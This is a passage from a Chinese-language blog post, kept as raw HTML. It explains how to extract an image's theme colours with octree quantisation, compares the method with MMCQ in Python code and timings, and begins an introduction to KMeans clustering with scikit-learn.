href=\"http://xcoder.in/2014/09/17/theme-color-extract/\">圖片主題色提取算法小結</a>。作者也提供了 Js 实现的代码，虽然与 Leptonica 中 C 实现的方法差别很大，但原理上是一致的。</p>\n<p>建立八叉树的原理实际上跟上面提到的统计直方图有些相似，将颜色成分转换成二进制之后，较低位（八叉树中位置较深层）数值将被压缩进较高位（八叉树中较浅层）。八叉树算法应用到主题色提取可能存在的问题是，每次削减掉的叶子数不确定，但是新增加的只有一个，这就导致我们需要的主题色数量并不一定刚好得到满足，例如设定的主题色数量为7，可能上一次叶子时总数还有10个，到了下一次只剩5个了。类似的问题在后面手动实现的KMeans算法中也有出现，为了保证可以得到足够的主题色，不得不强行提高算法中的颜色数量，然后取图像中包含数量较多的作为主题色：</p>\n<div>\n<!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab67035441f283821079\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\ndef getColors(self, node):\r\n      if node.isLeaf:\r\n          [r, g, b] = list(map(lambda n: int(n[0] / n[1]), zip([node.r, node.g, node.b], [node.n]*3)))\r\n          self.theme.append([r,g,b, node.n])\r\n      else:\r\n          for i in range(8):\r\n              if node.children[i] is not None:\r\n                  self.getColors(node.children[i])\r\nself.theme = sorted(self.theme, key=lambda c: -1*c[1])\r\nreturn list(map(lambda l: l[:-1],self.theme[:self.maxColor]))</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab67035441f283821079-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab67035441f283821079-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5bab67035441f283821079-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab67035441f283821079-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5bab67035441f283821079-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab67035441f283821079-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5bab67035441f283821079-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab67035441f283821079-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5bab67035441f283821079-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab67035441f283821079-10\">10</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab67035441f283821079-1\"><span class=\"crayon-e\">def </span><span class=\"crayon-e\">getColors</span><span class=\"crayon-sy\">(</span><span class=\"crayon-r\">self</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">node</span><span class=\"crayon-sy\">)</span><span class=\"crayon-o\">:</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab67035441f283821079-2\"><span class=\"crayon-h\">      </span><span class=\"crayon-st\">if</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">node</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">isLeaf</span><span class=\"crayon-o\">:</span></div><div class=\"crayon-line\" id=\"crayon-5bab67035441f283821079-3\"><span class=\"crayon-h\">          </span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">r</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">g</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">b</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">list</span><span class=\"crayon-sy\">(</span><span class=\"crayon-e\">map</span><span class=\"crayon-sy\">(</span><span class=\"crayon-i\">lambda</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">n</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">int</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">n</span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">n</span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">zip</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">node</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">r</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">node</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">g</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">node</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">b</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">node</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">n</span><span class=\"crayon-sy\">]</span><span class=\"crayon-o\">*</span><span class=\"crayon-cn\">3</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab67035441f283821079-4\"><span class=\"crayon-h\">          </span><span class=\"crayon-r\">self</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">theme</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">append</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">r</span><span class=\"crayon-sy\">,</span><span class=\"crayon-v\">g</span><span class=\"crayon-sy\">,</span><span class=\"crayon-v\">b</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">node</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">n</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5bab67035441f283821079-5\"><span class=\"crayon-h\">      </span><span class=\"crayon-st\">else</span><span class=\"crayon-o\">:</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab67035441f283821079-6\"><span class=\"crayon-h\">          </span><span class=\"crayon-st\">for</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">i</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">in</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">range</span><span class=\"crayon-sy\">(</span><span class=\"crayon-cn\">8</span><span class=\"crayon-sy\">)</span><span class=\"crayon-o\">:</span></div><div class=\"crayon-line\" id=\"crayon-5bab67035441f283821079-7\"><span class=\"crayon-h\">              </span><span class=\"crayon-st\">if</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">node</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">children</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">i</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">is</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">not</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">None</span><span class=\"crayon-o\">:</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab67035441f283821079-8\"><span class=\"crayon-h\">                  </span><span class=\"crayon-r\">self</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">getColors</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">node</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">children</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">i</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5bab67035441f283821079-9\"><span class=\"crayon-r\">self</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">theme</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">sorted</span><span class=\"crayon-sy\">(</span><span class=\"crayon-r\">self</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">theme</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">key</span><span class=\"crayon-o\">=</span><span class=\"crayon-i\">lambda</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">c</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">1</span><span class=\"crayon-o\">*</span><span class=\"crayon-v\">c</span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab67035441f283821079-10\"><span class=\"crayon-st\">return</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">list</span><span class=\"crayon-sy\">(</span><span class=\"crayon-e\">map</span><span class=\"crayon-sy\">(</span><span class=\"crayon-i\">lambda</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">l</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">l</span><span class=\"crayon-sy\">[</span><span class=\"crayon-o\">:</span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">,</span><span class=\"crayon-r\">self</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">theme</span><span class=\"crayon-sy\">[</span><span class=\"crayon-o\">:</span><span class=\"crayon-v\">self</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">maxColor</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0045 seconds] -->\r\n\n</div>\n<p>对比上面两种算法的结果：</p>\n<div>\n<!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab670354423496899236\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\ndef testOQ(pixDatas, maxColor):\r\n    start  = time.process_time()\r\n    themes = list(map(lambda d: OQ(d, maxColor).quantize(), pixDatas))\r\n    print(\"OQ Time cost: {0}\".format(time.process_time() - start))\r\n    return themes\r\nthemes = [testMMCQ(pixDatas, maxColor), testOQ(pixDatas, maxColor)]\r\nimgPalette(pixDatas, themes, [\"MMCQ Palette\", \"OQ Palette\"])</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab670354423496899236-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670354423496899236-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5bab670354423496899236-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670354423496899236-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5bab670354423496899236-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670354423496899236-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5bab670354423496899236-7\">7</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab670354423496899236-1\"><span class=\"crayon-e\">def </span><span class=\"crayon-e\">testOQ</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">pixDatas</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">maxColor</span><span class=\"crayon-sy\">)</span><span class=\"crayon-o\">:</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670354423496899236-2\"><span class=\"crayon-h\">    </span><span class=\"crayon-v\">start</span><span class=\"crayon-h\">  </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">time</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">process_time</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5bab670354423496899236-3\"><span class=\"crayon-h\">    </span><span class=\"crayon-v\">themes</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">list</span><span class=\"crayon-sy\">(</span><span class=\"crayon-e\">map</span><span class=\"crayon-sy\">(</span><span class=\"crayon-i\">lambda</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">d</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">OQ</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">d</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">maxColor</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">quantize</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">pixDatas</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670354423496899236-4\"><span class=\"crayon-h\">    </span><span class=\"crayon-e\">print</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">\"OQ Time cost: {0}\"</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">format</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">time</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">process_time</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">start</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5bab670354423496899236-5\"><span class=\"crayon-h\">    </span><span class=\"crayon-st\">return</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">themes</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670354423496899236-6\"><span class=\"crayon-v\">themes</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-e\">testMMCQ</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">pixDatas</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">maxColor</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">testOQ</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">pixDatas</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">maxColor</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">]</span></div><div class=\"crayon-line\" id=\"crayon-5bab670354423496899236-7\"><span class=\"crayon-e\">imgPalette</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">pixDatas</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">themes</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-s\">\"MMCQ Palette\"</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"OQ Palette\"</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">)</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0023 seconds] -->\r\n\n</div>\n<p><img src=\"http://jbcdn2.b0.upaiyun.com/2018/09/da8329bbfc99ea9a3cad518afc726a11.png\" alt=\"MMCQ vs OQ\"></p>\n<p>可见八叉树算法可能更适合用于提取调色板，而且两种算法运行时间差异也很明显：</p>\n<div>\n<!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab670354427394434333\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n#MMCQ Time cost: 8.238793\r\n\r\n#OQ Time cost: 55.173573</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab670354427394434333-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670354427394434333-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5bab670354427394434333-3\">3</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab670354427394434333-1\"><span class=\"crayon-p\">#MMCQ Time cost: 8.238793</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670354427394434333-2\"> </div><div class=\"crayon-line\" id=\"crayon-5bab670354427394434333-3\"><span class=\"crayon-p\">#OQ Time cost: 55.173573</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0003 seconds] -->\r\n\n</div>\n<p>除了OQ中采用较多递归以外，未对原图进行抽样处理也是其中原因之一。</p>\n<h2>2. 聚类</h2>\n<p>聚类是一种无监督式机器学习算法，我们这里采用K均值算法。虽然说是“机器学习”听起来时髦些，但算法本质上比上面两种更加简单粗暴。</p>\n<h3>KMeans算法</h3>\n<p>KMeans算法的原理更加简洁：“物以类聚”。我们目的是将一堆零散的数据（如上面图2）归为k个类别，使得每个类别中的每个数据样本，距离该类别的中心（质心，centroid）距离最小，数学公式为：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab67035442a189241926\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ $ \\sum_{i=0}^N \\min_{ \\mu_j \\in C} (||x_i - \\mu_j||^2) $ $</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab67035442a189241926-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab67035442a189241926-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">\\</span><span class=\"crayon-e\">sum_</span><span class=\"crayon-sy\">{</span><span class=\"crayon-v\">i</span><span class=\"crayon-o\">=</span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">}</span><span class=\"crayon-o\">^</span><span class=\"crayon-e\">N</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">\\</span><span class=\"crayon-e\">min_</span><span class=\"crayon-sy\">{</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">\\</span><span class=\"crayon-v\">mu</span><span class=\"crayon-sy\">_</span>j<span class=\"crayon-h\"> </span><span class=\"crayon-sy\">\\</span><span class=\"crayon-st\">in</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">C</span><span class=\"crayon-sy\">}</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-o\">||</span><span class=\"crayon-v\">x_i</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">\\</span><span class=\"crayon-v\">mu_j</span><span class=\"crayon-o\">||</span><span class=\"crayon-o\">^</span><span class=\"crayon-cn\">2</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">$</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0011 seconds] -->\r\n<p>上文提到八叉树算法可能出现结果与主题色数量不一致的情况，在KMeans算法中，初始的k个类别的质心的选择也可能导致类似的问题。当采用随机选择的方法时，有可能出现在迭代过程中，选择的中心点距离所有其它数据太远而最终导致被孤立。这里分别采用手动实现和<a href=\"http://scikit-learn.org/stable/index.html\">scikit-learn</a>的方法实现，根据<a href=\"http://scikit-learn.org/stable/modules/generated/sklearn.cluster.KMeans.html#sklearn.cluster.KMeans\">scikit-learn 提供的API</a>，完成主题色的提取大概只需要几行代码：</p>\n<div>\n<!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab67035442e756714063\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button 